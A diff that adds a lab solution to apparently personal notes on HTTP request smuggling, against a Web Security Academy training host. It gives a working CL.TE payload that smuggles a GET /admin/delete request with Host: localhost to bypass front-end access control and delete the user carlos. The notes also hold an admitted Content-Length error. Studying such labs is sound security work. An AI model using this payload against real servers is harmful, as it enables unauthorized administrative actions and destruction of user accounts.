@@ -284,3 +284,37 @@ Recap : So the front end since it's using TE, it will send all the payload, and 
     0\r\n
     \r\n
 and the content length is set to 13 it's 7 the size of `\r\n0\r\n\r\n` + `GET \` normally i mad a mistake it should be 14 since i used POST =) 
+
+## Lab solution
+
+After detecting it was CL.TE vulnerability, we want to delete the username carlos, and access admin page, since the authorization doesn't work on the Front, the payload i used is : 
+
+    POST / HTTP/1.1
+    Host: 0a9000d40391160c82299d3800c200bb.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 153
+    Transfer-Encoding: chunked
+
+    3
+    aaa
+    0
+
+    GET /admin/delete?username=carlos HTTP/1.1
+    Host: localhost
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 166
+
+    foo=bar
+
+and for the normal request : 
+
+    POST / HTTP/1.1
+    Host: 0a9000d40391160c82299d3800c200bb.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 7
+
+    foo=bar
+
+Explications : 
+
+Since the backend uses TE, we want to poison with with `GET /admin`, so the backend will get 3 aaa and 0 and it will stop processing the request putting `GET/admin` on the queue, and we change `Host: localhost` to bypass the filters and the content body, just crap to make everything else into a body that is ignored. 
